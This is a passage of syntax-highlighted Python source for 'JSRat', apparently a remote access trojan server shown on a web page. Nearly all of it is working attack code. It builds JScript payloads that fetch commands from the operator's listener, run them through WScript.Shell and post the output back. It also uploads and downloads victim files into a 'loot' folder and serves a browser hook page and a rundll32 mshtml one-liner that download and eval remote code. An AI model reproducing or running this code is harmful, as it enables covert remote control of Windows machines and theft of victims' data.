ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">                                		g.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">                                		g.Open(&quot;GET&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/uploadpath&quot;,false);</span></span><br><span class="line"><span class="string">					    	g.Send();</span></span><br><span class="line"><span class="string">					    	dpath = g.ResponseText;</span></span><br><span class="line"><span class="string">                                		g2 = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">                                		g2.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">                                		g2.Open(&quot;GET&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/uploaddata&quot;,false);</span></span><br><span class="line"><span class="string">					    	g2.Send();</span></span><br><span class="line"><span class="string">					    	ddata = g2.ResponseText;</span></span><br><span class="line"><span class="string">                                		fso1=new ActiveXObject(&quot;Scripting.FileSystemObject&quot;);</span></span><br><span class="line"><span class="string">                                		f=fso1.CreateTextFile(dpath,true);</span></span><br><span class="line"><span class="string">                                		f.WriteLine(ddata);</span></span><br><span class="line"><span class="string">                                		f.Close();</span></span><br><span class="line"><span class="string">                                		p=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">                                		p.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">					    	p.Open(&quot;POST&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/rat&quot;,false);</span></span><br><span class="line"><span class="string">					    	p.Send(&quot;[Upload Success]\\n&quot;);</span></span><br><span class="line"><span class="string">                                		continue;</span></span><br><span class="line"><span class="string">                            		&#125; else &#123;</span></span><br><span class="line"><span class="string">                            			r = new ActiveXObject(&quot;WScript.Shell&quot;).Exec(c);</span></span><br><span class="line"><span class="string">				    		var so;</span></span><br><span class="line"><span class="string">				    		while(!r.StdOut.AtEndOfStream)&#123;so=r.StdOut.ReadAll()&#125;</span></span><br><span class="line"><span class="string">						p=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">				    		p.Open(&quot;POST&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/rat&quot;,false);</span></span><br><span class="line"><span class="string">			 	       		p.Send(so + &quot;\\n&quot;);</span></span><br><span class="line"><span class="string">                            		&#125;</span></span><br><span class="line"><span class="string">                        	&#125; catch(e1) &#123;</span></span><br><span class="line"><span class="string">                            		p=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">                            		p.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">					p.Open(&quot;POST&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/rat&quot;,false);</span></span><br><span class="line"><span class="string">                            		p.Send(&quot;[ERROR - No Output]\\n&quot;);</span></span><br><span class="line"><span class="string">				&#125;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		&quot;&quot;&quot;</span></span><br><span class="line">  <span class="keyword">return</span> jsrat_code</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jsratCMD</span>():</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">      Build &amp; Return the core JS code to operate JSRat on victim</span></span><br><span class="line"><span class="string">      Essentially serve up additional JS to be evaluated by client based on need</span></span><br><span class="line"><span class="string">  &quot;&quot;&quot;</span></span><br><span class="line">  jsrat_codeCMD = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">				h = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">				h.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">                        	try &#123;</span></span><br><span class="line"><span class="string">							h.Open(&quot;GET&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/rat&quot;,false);</span></span><br><span class="line"><span class="string">							h.Send();</span></span><br><span class="line"><span class="string">							c = h.ResponseText;</span></span><br><span class="line"><span class="string">							r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(c,0,true);</span></span><br><span class="line"><span class="string">                        	&#125; catch(e1) &#123;</span></span><br><span class="line"><span class="string">                            		p=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">                            		p.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">					p.Open(&quot;POST&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/rat&quot;,false);</span></span><br><span class="line"><span class="string">                            		p.Send(&quot;[Some thing wrong !! ]\\n&quot;);</span></span><br><span class="line"><span class="string">				&#125;</span></span><br><span class="line"><span class="string">		&quot;&quot;&quot;</span></span><br><span class="line">  <span class="keyword">return</span> jsrat_codeCMD</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_jsrat_help</span>():</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">      Displays JSRat options for Server operator to interact w/Client||Victim</span></span><br><span class="line"><span class="string">  &quot;&quot;&quot;</span></span><br><span class="line">  <span class="built_in">print</span> white(underline(<span class="string">&quot;JSRat Usage Options:&quot;</span>))</span><br><span class="line">  <span class="built_in">print</span> <span class="built_in">str</span>(green(<span class="string">&quot;CMD&quot;</span>)) + <span class="built_in">str</span>(white(<span class="string">&quot;=&gt;&quot;</span>)) + <span class="built_in">str</span>(green(<span class="string">&quot;Executes Provided Command&quot;</span>))</span><br><span class="line">  <span class="built_in">print</span> <span class="built_in">str</span>(green(<span class="string">&quot;run&quot;</span>)) + <span class="built_in">str</span>(white(<span class="string">&quot;=&gt;&quot;</span>)) + <span class="built_in">str</span>(green(<span class="string">&quot;Run EXE or Script&quot;</span>))</span><br><span class="line">  <span class="built_in">print</span> <span class="built_in">str</span>(green(<span class="string">&quot;read&quot;</span>)) + <span class="built_in">str</span>(white(<span class="string">&quot;=&gt;&quot;</span>)) + <span class="built_in">str</span>(green(<span class="string">&quot;Read File&quot;</span>))</span><br><span class="line">  <span class="built_in">print</span> <span class="built_in">str</span>(green(<span class="string">&quot;upload&quot;</span>)) + <span class="built_in">str</span>(white(<span class="string">&quot;=&gt;&quot;</span>)) + <span class="built_in">str</span>(green(<span class="string">&quot;Upload File&quot;</span>))</span><br><span class="line">  <span class="built_in">print</span> <span class="built_in">str</span>(green(<span class="string">&quot;download&quot;</span>)) + <span class="built_in">str</span>(white(<span class="string">&quot;=&gt;&quot;</span>)) + <span class="built_in">str</span>(green(<span class="string">&quot;Download File&quot;</span>))</span><br><span class="line">  <span class="built_in">print</span> <span class="built_in">str</span>(green(<span class="string">&quot;delete&quot;</span>)) + <span class="built_in">str</span>(white(<span class="string">&quot;=&gt;&quot;</span>)) + <span class="built_in">str</span>(green(<span class="string">&quot;Delete File&quot;</span>))</span><br><span class="line">  <span class="built_in">print</span> <span class="built_in">str</span>(green(<span class="string">&quot;help&quot;</span>)) + <span class="built_in">str</span>(white(<span class="string">&quot;=&gt;&quot;</span>)) + <span class="built_in">str</span>(green(<span class="string">&quot;Help Menu&quot;</span>))</span><br><span class="line">  <span class="built_in">print</span> <span class="built_in">str</span>(green(<span class="string">&quot;exit&quot;</span>)) + <span class="built_in">str</span>(white(<span class="string">&quot;=&gt;&quot;</span>)) + <span class="built_in">str</span>(green(<span class="string">&quot;Exit Shell&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user_input</span>():</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    usr_input = raw_input(<span class="built_in">str</span>(red(<span class="string">&quot;$&quot;</span>))+<span class="built_in">str</span>(white(<span class="string">&quot;(&quot;</span>))+<span class="built_in">str</span>(blue(<span class="string">&quot;JSRat&quot;</span>))+<span class="built_in">str</span>(white(<span class="string">&quot;)&quot;</span>))+<span class="built_in">str</span>(red(<span class="string">&quot;&gt;&quot;</span>))+<span class="built_in">str</span>(white(<span class="string">&quot; &quot;</span>)))</span><br><span class="line">    <span class="keyword">if</span> usr_input.strip() != <span class="string">&quot;&quot;</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="built_in">print</span></span><br><span class="line">  <span class="keyword">return</span> usr_input.strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myHandler</span>(<span class="params">BaseHTTPRequestHandler</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">      Custom handler so we can control how different web requests are processed</span></span><br><span class="line"><span class="string">      Crude setup I threw together, but it works so get over it...</span></span><br><span class="line"><span class="string">  &quot;&quot;&quot;</span></span><br><span class="line">  js_load_path = <span class="string">&#x27;/connect&#x27;</span> <span class="comment"># Base URL path to initialize things (value is overridden at server start)</span></span><br><span class="line">  upload_path = <span class="string">&quot;&quot;</span> <span class="comment"># static so we can set/get as needed, since this isnt powershell...</span></span><br><span class="line">  time_to_stop = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">log_message</span>(<span class="params">self, <span class="built_in">format</span>, *args</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Custom Log Handler to Spit out on to stderr &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Handle any GET requests coming into our server</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    content_type = <span class="string">&quot;text/plain&quot;</span></span><br><span class="line">    response_message = jsrat()</span><br><span class="line">    <span class="keyword">if</span> self.js_load_path == self.path:</span><br><span class="line">      good(<span class="string">&quot;Incoming JSRat Client: %s&quot;</span> % <span class="built_in">str</span>(self.client_address[<span class="number">0</span>]))</span><br><span class="line">      <span class="keyword">if</span> <span class="string">&#x27;user-agent&#x27;</span> <span class="keyword">in</span> self.headers.keys() <span class="keyword">and</span> self.headers[<span class="string">&#x27;user-agent&#x27;</span>].strip() != <span class="string">&quot;&quot;</span>:</span><br><span class="line">      	good(<span class="string">&quot;User-Agent: %s&quot;</span> % self.headers[<span class="string">&#x27;User-Agent&#x27;</span>])</span><br><span class="line">      print_jsrat_help()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;/rat&quot;</span> == self.path:</span><br><span class="line">      <span class="comment"># Get input from server operator on what to do next...</span></span><br><span class="line">      response_message = get_user_input()</span><br><span class="line">      <span class="keyword">if</span> response_message.strip().lower() == <span class="string">&quot;help&quot;</span>:</span><br><span class="line">        print_jsrat_help()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">          response_message = get_user_input()</span><br><span class="line">          <span class="keyword">if</span> response_message.strip().lower() != <span class="string">&quot;help&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">          <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span></span><br><span class="line">      <span class="keyword">elif</span> response_message.strip().lower() == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>; caution(<span class="string">&quot;OK, sending kill command to Client...&quot;</span>)</span><br><span class="line">        response_message = <span class="string">&quot;cmd /c taskkill /f /im rundll32.exe&quot;</span></span><br><span class="line">        caution(<span class="string">&quot;Hit CTRL+C to kill server....&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;/uploadpath&quot;</span> == self.path:</span><br><span class="line">      lpath = raw_input(<span class="built_in">str</span>(red(<span class="string">&quot;$&quot;</span>))+<span class="built_in">str</span>(white(<span class="string">&quot;(&quot;</span>))+<span class="built_in">str</span>(blue(<span class="string">&quot;Enter Full Path for Local File to Upload&quot;</span>))+<span class="built_in">str</span>(white(<span class="string">&quot;)&quot;</span>))+<span class="built_in">str</span>(red(<span class="string">&quot;&gt;&quot;</span>))+<span class="built_in">str</span>(white(<span class="string">&quot; &quot;</span>)))</span><br><span class="line">      myHandler.upload_path = lpath</span><br><span class="line">      caution(<span class="string">&quot;Setting local upload path to: %s&quot;</span> % myHandler.upload_path)</span><br><span class="line">      destination_path = raw_input(<span class="built_in">str</span>(red(<span class="string">&quot;$&quot;</span>))+<span class="built_in">str</span>(white(<span class="string">&quot;(&quot;</span>))+<span class="built_in">str</span>(blue(<span class="string">&quot;Enter Remote Path to Write Uploaded Content&quot;</span>))+<span class="built_in">str</span>(white(<span class="string">&quot;)&quot;</span>))+<span class="built_in">str</span>(red(<span class="string">&quot;&gt;&quot;</span>))+<span class="built_in">str</span>(white(<span class="string">&quot; &quot;</span>)))</span><br><span class="line">      response_message = destination_path.strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;/uploaddata&quot;</span> == self.path:</span><br><span class="line">      response_message = <span class="built_in">open</span>(myHandler.upload_path, <span class="string">&#x27;rb+&#x27;</span>).read()</span><br><span class="line">      myHandler.upload_path = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;/hook&quot;</span> == self.path:</span><br><span class="line">      good(<span class="string">&quot;Hooking Client: %s&quot;</span> % <span class="built_in">str</span>(self.client_address[<span class="number">0</span>]))</span><br><span class="line">      content_type = <span class="string">&quot;text/html&quot;</span></span><br><span class="line">      response_message = jsrat()</span><br><span class="line">      response_message = <span class="string">&quot;&quot;&quot;&lt;!doctype html public &quot;-//w3c//dtd html 4.0 transitional//en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">   &lt;title&gt; new document &lt;/title&gt;</span></span><br><span class="line"><span class="string">   &lt;meta name=&quot;generator&quot; content=&quot;editplus&quot;&gt;</span></span><br><span class="line"><span class="string">   &lt;meta name=&quot;author&quot; content=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">   &lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">   &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">   &lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span></span><br><span class="line"><span class="string">      h=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">      h.Open(&quot;GET&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+srv_url+<span class="string">&quot;&quot;&quot;&quot;,false);</span></span><br><span class="line"><span class="string">      h.Send();</span></span><br><span class="line"><span class="string">      B=h.ResponseText;</span></span><br><span class="line"><span class="string">      eval(B);</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;/wtf&quot;</span> == self.path:</span><br><span class="line">      good(<span class="string">&quot;Client Command Query from: %s&quot;</span> % <span class="built_in">str</span>(self.client_address[<span class="number">0</span>]))</span><br><span class="line">      response_message = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+srv_url+<span class="string">&quot;&quot;&quot;&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;&quot;&quot;&quot;</span></span><br><span class="line">      <span class="built_in">print</span> cyan(response_message + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Send the built response back to client</span></span><br><span class="line">    self.send_response(<span class="number">200</span>)</span><br><span class="line">    self.send_header(<span class="string">&#x27;Content-type&#x27;</span>,content_type)</span><br><span class="line">    self.end_headers()</span><br><span class="line">    self.wfile.write(response_message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">do_POST</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Handle any POST requests coming into our server</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;/rat&quot;</span> == self.path:</span><br><span class="line">      content_len = <span class="built_in">int</span>(self.headers.getheader(<span class="string">&#x27;content-length&#x27;</span>, <span class="number">0</span>))</span><br><span class="line">      post_body = self.rfile.read(content_len)</span><br><span class="line">      <span class="built_in">print</span> cyan(post_body)</span><br><span class="line">      <span class="keyword">if</span> post_body == <span class="string">&quot;[No Output]&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span></span><br><span class="line">      self.send_response(<span class="number">200</span>)</span><br><span class="line">      self.send_header(<span class="string">&#x27;Content-type&#x27;</span>,<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">      self.end_headers()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;/download&quot;</span> == self.path:</span><br><span class="line">      content_len = <span class="built_in">int</span>(self.headers.getheader(<span class="string">&#x27;content-length&#x27;</span>, <span class="number">0</span>))</span><br><span class="line">      post_body = self.rfile.read(content_len)</span><br><span class="line">      fname = raw_input(<span class="built_in">str</span>(red(<span class="string">&quot;$&quot;</span>))+<span class="built_in">str</span>(white(<span class="string">&quot;(&quot;</span>))+<span class="built_in">str</span>(blue(<span class="string">&quot;Enter Filename to Save in ./loot/&quot;</span>))+<span class="built_in">str</span>(white(<span class="string">&quot;)&quot;</span>))+<span class="built_in">str</span>(red(<span class="string">&quot;&gt;&quot;</span>))+<span class="built_in">str</span>(white(<span class="string">&quot; &quot;</span>)))</span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">        loot_file = outdir.strip()+fname.strip()</span><br><span class="line">        fh = <span class="built_in">open</span>(loot_file, <span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">        fh.write(post_body)</span><br><span class="line">        fh.close()</span><br><span class="line">        pad(); good(<span class="string">&quot;Successfully Saved To: %s\n&quot;</span> % loot_file.replace(home, <span class="string">&quot;./&quot;</span>))</span><br><span class="line">      <span class="keyword">except</span> Exception, e:</span><br><span class="line">        error(<span class="string">&quot;Problem saving content to:&quot;</span>)</span><br><span class="line">        pad(); bad(<span class="string">&quot;%s&quot;</span> % loot_file.replace(home, <span class="string">&quot;./&quot;</span>))</span><br><span class="line">        pad(); pad(); bad(<span class="built_in">str</span>(e))</span><br><span class="line">      self.send_response(<span class="number">200</span>)</span><br><span class="line">      self.send_header(<span class="string">&#x27;Content-type&#x27;</span>,<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">      self.end_headers()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      caution(<span class="string">&quot;%s - Snooper detected...&quot;</span> % <span class="built_in">str</span>(self.client_address[<span class="number">0</span>]))</span><br><span class="line">      pad(); caution(<span class="string">&quot;=&gt; %s&quot;</span> % self.path)</span><br><span class="line">      self.send_error(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SendCMDHandler</span>(<span class="params">BaseHTTPRequestHandler</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">      Send command handler so we can auto send command to clinets...</span></span><br><span class="line"><span class="string">  &quot;&quot;&quot;</span></span><br><span class="line">  js_load_path = <span class="string">&#x27;/connect&#x27;</span> <span class="comment"># Base URL path to initialize things (value is overridden at server start)</span></span><br><span class="line">  upload_path = <span class="string">&quot;&quot;</span> <span class="comment"># static so we can set/get as needed, since this isnt powershell...</span></span><br><span class="line">  time_to_stop = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">log_message</span>(<span class="params">self, <span class="built_in">format</span>, *args</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Custom Log Handler to Spit out on to stderr &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Handle any GET requests coming into our server</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    content_type = <span class="string">&quot;text/plain&quot;</span></span><br><span class="line">    response_message = jsratCMD()</span><br><span class="line">    <span class="keyword">if</span> self.js_load_path == self.path:</span><br><span class="line">      good(<span class="string">&quot;Incoming JSRat Client: %s&quot;</span> % <span class="built_in">str</span>(self.client_address[<span class="number">0</span>]))</span><br><span class="line">      <span class="keyword">if</span> <span class="string">&#x27;user-agent&#x27;</span> <span class="keyword">in</span> self.headers.keys() <span class="keyword">and</span> self.headers[<span class="string">&#x27;user-agent&#x27;</span>].strip() != <span class="string">&quot;&quot;</span>:</span><br><span class="line">      	good(<span class="string">&quot;User-Agent: %s&quot;</span> % self.headers[<span class="string">&#x27;User-Agent&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;/rat&quot;</span> == self.path:</span><br><span class="line">      <span class="comment">#Send command</span></span><br><span class="line">      response_message = <span class="string">&quot;cmd.exe /c &quot;</span>+command+<span class="string">&quot; &amp;&amp; taskkill /f /im rundll32.exe&quot;</span></span><br><span class="line">      good(<span class="string">&quot;OK, Success Send command to Client...&quot;</span>)</span><br><span class="line">      caution(<span class="string">&quot;Hit CTRL+C to kill server....&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;/hook&quot;</span> == self.path:</span><br><span class="line">      good(<span class="string">&quot;Hooking Client: %s&quot;</span> % <span class="built_in">str</span>(self.client_address[<span class="number">0</span>]))</span><br><span class="line">      content_type = <span class="string">&quot;text/html&quot;</span></span><br><span class="line">      response_message = jsrat()</span><br><span class="line">      response_message = <span class="string">&quot;&quot;&quot;&lt;!doctype html public &quot;-//w3c//dtd html 4.0 transitional//en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">   &lt;title&gt; new document &lt;/title&gt;</span></span><br><span class="line"><span class="string">   &lt;meta name=&quot;generator&quot; content=&quot;editplus&quot;&gt;</span></span><br><span class="line"><span class="string">   &lt;meta name=&quot;author&quot; content=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">   &lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">   &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">   &lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span></span><br><span class="line"><span class="string">      h=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">      h.Open(&quot;GET&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+srv_url+<span class="string">&quot;&quot;&quot;&quot;,false);</span></span><br><span class="line"><span class="string">      h.Send();</span></span><br><span class="line"><span class="string">      B=h.ResponseText;</span></span><br><span class="line"><span class="string">      eval(B);</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;/wtf&quot;</span> == self.path:</span><br><span class="line">      good(<span class="string">&quot;Client Command Query from: %s&quot;</span> % <span class="built_in">str</span>(self.client_address[<span class="number">0</span>]))</span><br><span class="line">      response_message = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+srv_url+<span class="string">&quot;&quot;&quot;&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;&quot;&quot;&quot;</span></span><br><span class="line">      <span class="built_in">print</span> cyan(response_message + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Send the built response back to client</span></span><br><span class="line">    self.send_response(<span class="number">200</span>)</span><br><span class="line">    self.send_header(<span class="string">&#x27;Content-type&#x27;</span>,content_type)</span><br><span class="line">    self.end_headers()</span><br><span class="line">    self.wfile.write(response_message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">do_POST</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Handle any POST requests coming into our server</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;/rat&quot;</span> == self.path:</span><br><span class="line">      content_len = <span class="built_in">int</span>(self.headers.getheader(<span class="string">&#x27;content-length&#x27;</span>, <span class="number">0</span>))</span><br><span class="line">      post_body = self.rfile.read(content_len)</span><br><span class="line">      <span class="built_in">print</span> cyan(post_body)</span><br><span class="line">      <span class="keyword">if</span> post_body == <span class="string">&quot;[No Output]&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span></span><br><span class="line">      self.send_response(<span class="number">200</span>)</span><br><span class="line">      self.send_header(<span class="string">&#x27;Content-type&#x27;</span>,<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">      self.end_headers()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">      Establish our base web server and initiate the event loop to drive things</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      1 - Overrides custom handler path for URL to initiate things</span></span><br><span class="line"><span class="string">      2 - Binds socket to ip and port, and then maps to our custom handler</span></span><br><span class="line"><span class="string">      3 - Starts endless event loop &amp; pass off for myHandler to handle requests</span></span><br><span class="line"><span class="string">  &quot;&quot;&quot;</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span></span><br><span class="line">    <span class="keyword">global</span> httpd</span><br><span class="line">    <span class="keyword">if</span> options.cmd <span class="keyword">in</span> args:</span><br><span class="line">    	SendCMDHandler.js_load_path = srv_url</span><br><span class="line">    	httpd = SocketServer.TCPServer((bind_ip, listener_port),SendCMDHandler)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    	myHandler.js_load_path = srv_url</span><br><span class="line">    	httpd = SocketServer.TCPServer((bind_ip, listener_port), myHandler)</span><br><span class="line">    status(<span class="string">&quot;Web Server Started on Port: %d&quot;</span> % listener_port)</span><br><span class="line">    status(<span class="string">&quot;Awaiting Client Connection to: http://%s:%s%s&quot;</span> % (bind_ip, listener_port, srv_url))</span><br><span class="line">    status(<span class="string">&quot;Client Command at: http://%s:%s/wtf&quot;</span> % (bind_ip, listener_port))</span><br><span class="line">    status(<span class="string">&quot;Browser Hook Set at: http://%s:%s/hook\n&quot;</span> % (bind_ip, listener_port))</span><br><span class="line">    caution(<span class="string">&quot;Hit CTRL+C to Stop the Server at any time...\n&quot;</span>)</span><br><span class="line">    httpd.serve_forever()</span><br><span class="line">  <span 